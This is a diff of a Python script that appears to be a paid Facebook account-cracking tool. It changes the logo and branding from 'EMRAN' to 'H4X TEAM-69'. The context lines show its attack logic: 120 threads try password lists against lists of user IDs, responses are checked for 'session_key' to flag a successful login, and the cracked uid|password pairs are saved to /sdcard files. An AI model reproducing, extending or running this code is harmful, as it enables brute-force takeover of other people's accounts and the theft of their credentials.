@@ -1,4 +1,4 @@
-#---EMRAN-PAID-SE--1500 TAKA
+#---AT TEAM-1-PAID-SE--1500 TAKA
 import os, random, sys, json, uuid, time
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
@@ -10,19 +10,13 @@ except:
 
 li="\033[38;5;46m="
 cox=str(f"{li}"*37)
-logo=f"""
-    \033[38;5;46m.----------------.  .----------------.  .----------------. 
-\033[38;5;46m| .--------------. || .--------------. || .--------------. |
-\033[38;5;46m| |  ____  ____  | || |   _    _     | || |  ____  ____  | |
-\033[38;5;46m| | |_   ||   _| | || |  | |  | |    | || | |_  _||_  _| | |
-\033[38;5;46m| |   | |__| |   | || |  | |__| |_   | || |   \ \  / /   | |
-\033[38;5;46m| |   |  __  |   | || |  |____   _|  | || |    > `' <    | |
-\033[38;5;46m| |  _| |  | |_  | || |      _| |_   | || |  _/ /'`\ \_  | |
-\033[38;5;46m| | |____||____| | || |     |_____|  | || | |____||____| | |
-\033[38;5;46m| |              | || |              | || |              | |
-\033[38;5;46m| '--------------' || '--------------' || '--------------' |
-\033[38;5;46m '----------------'  '----------------'  '----------------' 
-\033[38;5;46m================================="""
+logo=f"""\033[38;5;46m
+██   ██ ██████  ██   ██     
+██   ██ ██   ██  ██ ██      
+███████ ██████    ███       
+██   ██ ██   ██  ██ ██      
+██   ██ ██   ██ ██   ██     
+"""
 def logox():
     os.system('clear')
     print(logo)
@@ -36,7 +30,7 @@ def main():
         file_iclone()
     elif want in ["B","b","2","02"]:
         print(cox)
-        print("  [✓] Thanks For using My tool")
+        print("  [✓] Thanks For using H4X tool")
         print(cox)
         sys.exit()
     else:
@@ -64,7 +58,7 @@ def auto_pass(fileeee):
     tl=str(len(fileeee))
     print("  [✓] Total id in File : "+tl)
     print(cox)
-    print("  [✓] Id Save: /sdcard/Adib.txt")
+    print("  [✓] Id Save: /sdcard/SB TEAM-1.txt")
     print(cox)
     with ThreadPool (max_workers=120) as feel:
         for data in fileeee:
@@ -148,7 +142,7 @@ oks=[]
 cps=[]
 def file_subb(uid,pwx):
     global oks,loop,cps
-    sys.stdout.write(f"\r  \033[38;5;46m[EMRAN] {loop}|{str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r  \033[38;5;46m[H4X TEAM-69] {loop}|{str(len(oks))}");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in pwx:
@@ -195,12 +189,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [OK] {uid} | {ps}      ")
-                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/H4X TEAM-69-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r। [OK] {uid} | {ps}      ")
-                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/H4X TEAM-69-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r  [CP] {uid} | {ps}      ")
